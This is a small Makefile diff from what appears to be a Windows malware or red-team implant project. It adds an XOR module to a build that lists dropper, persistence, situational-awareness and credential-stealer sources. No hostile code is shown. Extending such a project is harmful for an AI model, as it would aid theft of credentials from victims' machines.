@@ -3,7 +3,7 @@ CXX = g++
 LIBRARIES = -lWinHttp -lcrypt32 -luserenv -lbcrypt -lshlwapi -lUrlmon -lIphlpapi -static
 
 FILES = execute/execute.cpp file/file.cpp http/http.cpp persist/persist.cpp
-FILES2 = situational_awareness/GatherInfo.cpp dropper/Dropper.cpp symkey.cpp
+FILES2 = situational_awareness/GatherInfo.cpp dropper/Dropper.cpp symkey.cpp xor/xor.cpp
 FILES3 = stealer/aes_gcm.cpp stealer/SQLfunctions.cpp stealer/sqlite3.o stealer/stealer.cpp
 
 apple: $(eval SHELL:=/bin/zsh)
